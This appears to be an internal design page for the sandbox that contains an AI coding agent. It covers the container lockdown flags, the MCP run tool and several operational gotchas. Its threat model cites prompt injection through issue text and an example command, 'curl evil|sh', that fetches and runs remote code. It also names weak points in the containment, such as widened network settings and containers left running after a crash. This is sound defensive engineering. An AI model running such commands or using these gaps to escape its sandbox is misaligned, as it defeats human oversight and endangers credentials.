---
title: Sandbox
type: subsystem
summary: Ephemeral, credential-free, no-network container that every agent and gate command runs in — plus the one-tool MCP server that is the agent's only way to reach it.
sources:
  - kontinuum/sandbox.py
  - kontinuum/sandbox_mcp.py
last_verified:
  date: 2026-08-16
  sha: seed
related: [subsystems/agent-seam, subsystems/execution-pipeline, adr/0002-host-agent-sandboxed-commands]
---

## What it does

The containment boundary (mvp §3, §8). Issue text is attacker-influenceable and the agent decides
what to run, so every command it issues — and the repo's own gate — executes in a container with
**no host env forwarded, no network, no capabilities, and nothing mounted but the task's git
worktree at `/work`**. An injected `curl evil|sh` has no credential to read and nowhere to send one.

The agent itself still runs on the host (its login lives there). That is deliberate: it only
*reasons* and edits files there, and routes every command into the box via MCP. See
`kontinuum/agent.py:13-28` for what is enforced vs merely trusted.

Two modes, one identical lockdown (`_flags()` is the single source of both):

- `run()` — throwaway `docker run --rm` for one command. Used for the gate and the setup step.
- `start()/exec()/stop()` — a persistent container the agent execs many commands into, so
  `pip install` then `pytest` share state. Context-manager friendly.

## Key entry points

- `kontinuum/sandbox.py:27` — `_flags()`: the whole security posture in one list. The `--user`
  comment explains why matching the host uid is required, not cosmetic.
- `kontinuum/sandbox.py:36` / `:41` / `:50` / `:57` — `run` / `start` / `exec` / `stop`.
- `kontinuum/sandbox_mcp.py:18` — the single `run` tool schema handed to the agent.
- `kontinuum/sandbox_mcp.py:30` — `_run()`: `docker exec` into the container named by
  `KONTINUUM_SANDBOX_CID`. `kontinuum/sandbox_mcp.py:42` — the three JSON-RPC methods.
- `kontinuum/agent.py:96-101` — where the box is started and its container id is injected into the
  MCP server's env; `kontinuum/agent.py:110-112` — Bash disabled, only this tool allowed.
- `kontinuum/loop.py:124` and `kontinuum/loop.py:137` — the two boxes a task creates.
- `kontinuum/pipeline.py:46` — the gate runs in its own one-off box, *not* the agent's.
- `tests/test_sandbox.py:23-44` — the isolation probes (env leak, egress, `/work` writability,
  persistence). They need a live Docker daemon and skip without one.

## Gotchas / non-obvious

- **Setup is online, everything after it is not.** `recipe.setup` runs with `--network bridge`,
  hardcoded at `kontinuum/loop.py:124` — it is repo-authored and deterministic, so it is trusted to
  fetch deps. `recipe.network` (default `none`) governs only the *agent + gate* box. Widening the
  recipe's `network` to `bridge` removes control #1 for the untrusted half; prefer baking deps into
  `image` or installing them in `setup`.
- **Deps must land under `/work`.** The gate gets a fresh container, so anything installed into the
  agent's persistent box outside the mount is gone by gate time. This is why the onboarding prompt
  insists on e.g. `pip install --target /work/.deps` (`kontinuum/loop.py:272`).
- **Git does not work inside the box.** Only `workdir` is mounted; a worktree's `.git` is a *file*
  pointing at the cache clone, which is not. All git runs host-side in `pipeline.py` / `effects.py`
  — by design (git is a credentialed effect), but it surprises agents that try `git status`.
- **State between attempts:** the agent's container is started and destroyed per attempt
  (`kontinuum/agent.py:97,119`), and a failed attempt is `git reset --hard` + `clean -fd`
  (`kontinuum/pipeline.py:67-68`). So in-container state is gone and worktree edits are discarded —
  but deps installed by `setup` survive, because they were added to `.git/info/exclude` and
  `clean -fd` (no `-x`) leaves ignored files alone.
- **Fail-closed, but leaky on crash.** Missing `KONTINUUM_SANDBOX_CID` makes the tool return an
  error rather than run on the host (`kontinuum/sandbox_mcp.py:33`). However `start()` uses
  `docker run -d` without `--rm`, so a hard K crash leaves a container running; `stop()` is only
  reached via the normal `finally`.
- **A non-zero exit is not an error.** `_run` returns `isError` only for infra failures; a failing
  test comes back as `exit=1` plus output, which is what the retry loop feeds back as `feedback`.
  Both layers cap a command at 600s.
- **No command allowlist, on purpose.** The tool runs arbitrary `sh -c`. Safety comes from where it
  runs, not from filtering what runs — the reason the box must stay locked down rather than the
  tool getting clever.
- **Image must tolerate an arbitrary uid.** Containers run as the host user with `--cap-drop ALL`;
  images that assume root or a writable `$HOME` fail here (usually silently, as EACCES on Linux).

## See also

- `docs/kontinuum-mvp.md` §3 (architecture split) and §8 (threat model, controls 1-3).
- `subsystems/agent-seam` — the contract the sandbox enforces on any backend.
- `subsystems/execution-pipeline` — attempt/retry loop that owns the reset semantics above.
